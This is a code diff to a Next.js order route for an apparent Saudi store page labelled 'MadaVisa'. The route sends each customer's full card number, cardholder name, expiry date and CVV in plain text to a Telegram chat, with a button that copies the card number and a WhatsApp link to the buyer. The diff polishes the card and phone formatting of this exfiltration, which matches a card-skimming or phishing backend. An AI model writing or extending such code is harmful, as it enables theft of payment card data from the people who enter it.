@@ -54,6 +54,16 @@ export async function POST(req: NextRequest) {
   }
 
   // إرسال التلجرام فقط بعد نجاح الحفظ
+  // Format card number with spaces every 4 digits for display
+  const rawCard = (cardNumber as string).replace(/\s/g, "");
+  const displayCard = rawCard.replace(/(.{4})/g, "$1 ").trim();
+
+  // Convert Saudi phone: 966XXXXXXXXX → 05XXXXXXXX
+  let whatsappNum = (whatsapp ?? "").replace(/\D/g, "");
+  if (whatsappNum.startsWith("966") && whatsappNum.length === 12) {
+    whatsappNum = "0" + whatsappNum.slice(3);
+  }
+
   const text = [
     `🏪 طلب لـ متجر مؤسسة برج المبدع `,
     `🔢 رقم الطلب: #${orderId}`,
@@ -65,19 +75,18 @@ export async function POST(req: NextRequest) {
     ``,
     `💳 MadaVisa - New Order`,
     `👤 Order For: ${customer ?? "-"}`,
-    `📱 WhatsApp: ${whatsapp ?? "-"}`,
+    `📱 WhatsApp: ${whatsappNum || "-"}`,
     `🌍 Country: ${country}`,
-    `💳 Card Number: ${cardNumber}`,
+    `💳 Card Number: ${displayCard}`,
     `👤 Card Holder: ${cardHolder}`,
     `📅 Valid To: ${expiry}`,
     `🔐 CVV: ${cvv}`,
   ].join("\n");
 
-  const whatsappNum = (whatsapp ?? "").replace(/\D/g, "");
   const buttons: object[] = [
-    { text: "📋 نسخ رقم البطاقة", copy_text: { text: (cardNumber as string).replace(/\s/g, "") } },
+    { text: "📋 نسخ رقم البطاقة", copy_text: { text: rawCard } },
   ];
-  if (whatsappNum) buttons.push({ text: "💬 فتح واتساب", url: `https://wa.me/${whatsappNum}` });
+  if (whatsappNum) buttons.push({ text: "💬 فتح واتساب", url: `https://wa.me/966${whatsappNum.slice(1)}` });
   const reply_markup = { inline_keyboard: [buttons] };
 
   const sent = await sendToTelegram({ chat_id: process.env.TELEGRAM_CHAT_ID, text, reply_markup });
